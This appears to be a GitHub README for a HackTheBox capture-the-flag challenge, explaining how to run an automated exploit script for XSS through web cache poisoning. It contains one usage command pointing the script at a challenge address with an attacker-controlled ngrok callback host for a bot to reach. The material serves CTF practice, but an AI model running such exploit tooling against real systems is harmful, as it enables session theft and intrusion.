# EasterBunny

EasterBunny is a HackTheBox challenge that addresses an XSS through web cache poisoning. An autopwn exploit was created for this challenge.
___
#### How to use:
```bash
python3 exploit.py -rhost "http://94.237.49.212:31154" -lhost 'https://995f-189-85-172-20.ngrok-free.app'
```

`rhost` is related to the challenge's IP, where you need to provide `http://` or `https://` + IP. 

The `lhost` is your server address, as a web server will be opened on your machine for the bot to access. In other words, it should be an address that anyone can access.

Exemple:

![image](https://github.com/Vsmzin/HackTheBox-Writeups/assets/65165845/e9c88ed9-baef-4188-b7da-8e84256af8c3)
